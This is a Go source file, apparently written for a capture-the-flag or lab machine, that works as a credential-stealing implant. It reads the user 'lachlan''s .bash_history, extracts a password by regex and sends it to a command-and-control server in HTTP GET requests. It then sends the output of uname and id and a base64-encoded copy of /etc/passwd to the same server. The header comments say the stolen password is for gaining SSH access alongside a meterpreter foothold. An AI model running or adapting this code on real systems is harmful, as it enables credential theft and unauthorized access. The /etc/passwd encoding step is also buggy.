//============================================================
//
// To compile:
//		go build explore.go
//
//============================================================
//
// This script is designed to seek out the user "lachlan"'s
// password and send it back to a C2 server as a "GET" request.
//
// Once the user has posession of the password, they are able
// to SSH into the target machine using the credentials
// "lachlan:<password>".
//
// This can be used alongside the meterpreter shell spawned by
// foothold.py or this can replace the msfvenom payload and
// give the user "legitimate" access to the machine via SSH by
// stealing the user credentials.
//
// This also attempts to read the contents of /etc/passwd,
// base64 encode them, and pass them to the C2 server.
//
//============================================================
//
// Note:
// If the GET requests to the C2 server fail, the program does
// not exit; the message is displayed to the user and the
// execution continues as normal.
//
//============================================================
package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_RST = "\033[0m"
var ANSI_CLRSCRN string = "\x1b[2J\033[H"

var ANSI_BLU string = "\x1b[34;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_RED string = "\x1b[31;1m"

func InfoMsg(msg string) {
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[i] %s\n", ANSI_CLRLN, msg)
	} else {
		fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	}
}

func InfoMsgNB(msg string) {
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[i] %s", ANSI_CLRLN, msg)
	} else {
		fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	}
}

func SucMsg(msg string) {
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[+] %s\n", ANSI_CLRLN, msg)
	} else {
		fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	}
}

func ErrMsg(msg string) {
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[-] %s\n", ANSI_CLRLN, msg)
	} else {
		fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	}
}

func SysMsg(msg string) {
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[*] %s\n", ANSI_CLRLN, msg)
	} else {
		fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	}
}

func SysMsgNB(msg string) {
	if runtime.GOOS == "windows" {
		fmt.Printf("%s[*] %s", ANSI_CLRLN, msg)
	} else {
		fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	}
}

func GrabPasswordLine(filecontent []byte) (line string, success bool, message string) {
	re, err := regexp.Compile(".*passwd")
	if err != nil {
		return "", false, err.Error()
	}
	line = string(re.Find(filecontent))
	return line, true, "Password grabbed."
}

func TellPassword(c2server string, data string) (success bool, message string) {
	c2url := fmt.Sprintf("http://%s/%s", c2server, data)
	client := http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("GET", c2url, nil)
	if err != nil {
		return false, err.Error()
	}

	_, err = client.Do(req)
	if err != nil {
		return false, err.Error()
	}
	return true, "Password transmitted to C2."
}

func main() {
	var c2address string
	var target_ip string
	var target_port int
	var passwd_contents []byte

	flag.StringVar(&target_ip, "i", "127.0.0.1", "ip address of C2 machine.")
	flag.IntVar(&target_port, "p", 9999, "port to talk to C2 on.")
	flag.Parse()

	c2address = fmt.Sprintf("%s:%d", target_ip, target_port)
	InfoMsg(c2address)

	output, err := exec.Command("cat", "/home/lachlan/.bash_history").Output()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	passline, success, message := GrabPasswordLine(output)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	password := strings.Split(passline, "\\n")[1]
	password = strings.Split(password, "\"")[0]

	InfoMsg(fmt.Sprintf("Password: %s", password))

	success, message = TellPassword(c2address, fmt.Sprintf("user=lachlan&password=%s", password))
	if !success {
		ErrMsg(message)
	}

	output, err = exec.Command("uname", "-a").Output()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	str_output := strings.Replace(string(output), "\n", "", -1)

	success, message = TellPassword(c2address, fmt.Sprintf("%s", str_output))
	if !success {
		ErrMsg(message)
	}
	InfoMsg(str_output)

	output, err = exec.Command("id").Output()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	str_output = strings.Replace(string(output), "\n", "", -1)

	success, message = TellPassword(c2address, fmt.Sprintf("id=%s", str_output))
	if !success {
		ErrMsg(message)
	}
	InfoMsg(str_output)

	output, err = exec.Command("cat", "/etc/passwd").Output()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	base64.StdEncoding.Encode(passwd_contents, output)
	str_output = string(passwd_contents)

	success, message = TellPassword(c2address, fmt.Sprintf("passwd=%s", str_output))
	if !success {
		ErrMsg(message)
	}
	InfoMsg(string(output))

	return
}

